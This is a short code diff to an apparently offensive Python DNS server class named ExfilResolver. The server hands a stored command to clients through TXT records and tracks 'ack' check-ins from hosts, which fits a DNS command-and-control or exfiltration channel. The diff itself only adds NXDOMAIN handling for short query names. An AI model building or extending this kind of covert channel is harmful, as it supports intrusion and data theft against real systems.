@@ -86,12 +86,15 @@ class ExfilResolver(BaseResolver):
         reply = request.reply()
 
         print(qname)
-        if qname.split(".")[-2] == "ack":
-            host = qname.split(".")[0]
-            print(qname.split("."))
-            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
+        if len(qname.split(".")) > 2:
+            if qname.split(".")[-2] == "ack":
+                host = qname.split(".")[0]
+                print(qname.split("."))
+                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
+            else:
+                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
         else:
-            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
+            reply.header.rcode = RCODE.NXDOMAIN
 
         # self.cmd = "true"
 
